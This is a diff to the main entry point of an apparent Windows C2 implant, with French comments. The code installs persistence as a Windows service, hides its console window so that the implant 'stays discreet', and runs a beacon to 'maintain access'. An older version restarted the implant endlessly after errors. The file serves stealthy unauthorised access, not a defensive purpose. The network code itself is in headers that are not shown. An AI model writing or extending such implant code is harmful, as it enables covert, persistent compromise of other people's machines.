@@ -1,40 +1,40 @@
 #include "beacon.h"
-#include "error.h"
 #include "persistence.h"
-#include <chrono>
-#include <exception>
-#include <iostream>
-#include <thread>
+#include "service.h"
+#include "log.h"
 #include <windows.h>
+#include <string>
 
-int main() {
-	// Build Debug (NDEBUG absent) : la console reste visible, ce qui permet de
-	// suivre les erreurs dans Visual Studio (F5) ou en ligne de commande.
-	// Build Release : aucune fenetre, l'implant doit rester discret.
+int main(int argc, char** argv) {
+    // Mode installation explicite via la ligne de commande
+    if (argc > 1 && std::string(argv[1]) == "--install") {
+        return install_persistence() ? 0 : 1;
+    }
+
+    // 1. Tenter de se connecter au SCM (si lance par le Service Control Manager)
+    int res = run_as_service();
+    if (res == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
+        // 2. Si on n'est pas lance par le SCM :
 #ifdef NDEBUG
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+        // En Release : on tente d'installer et de demarrer le service Windows.
+        // Si l'installation reussit, le processus d'installation quitte pour
+        // laisser le service tourner seul en arriere-plan (evite le double beacon).
+        if (install_persistence()) {
+            return 0;
+        }
+
+        // Si l'installation a echoue (ex: non-admin), on tourne directement
+        // en console masquee pour maintenir l'acces.
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+        start_implant();
+        return 0;
+#else
+        // En Debug : on configure la persistance mais on execute l'implant dans
+        // la console courante pour afficher les logs en direct.
+        install_persistence();
+        start_implant();
+        return 0;
 #endif
-
-	if (install_persistence()) {
-		std::cout << "Persistance installee avec succes." << std::endl;
-	}
-	else {
-		std::cout << "Echec de l'installation de la persistance." << std::endl;
-	}
-
-	// Une exception ne doit jamais tuer l'implant : on la trace et on relance
-	// la boucle apres une courte pause.
-	for (;;) {
-		try {
-			start_implant();
-		}
-		catch (const std::exception& error) {
-			std::cerr << "exception: " << error.what() << std::endl;
-		}
-		catch (...) {
-			std::cerr << "exception inconnue" << std::endl;
-		}
-
-		std::this_thread::sleep_for(std::chrono::seconds(5));
-	}
+    }
+    return res;
 }
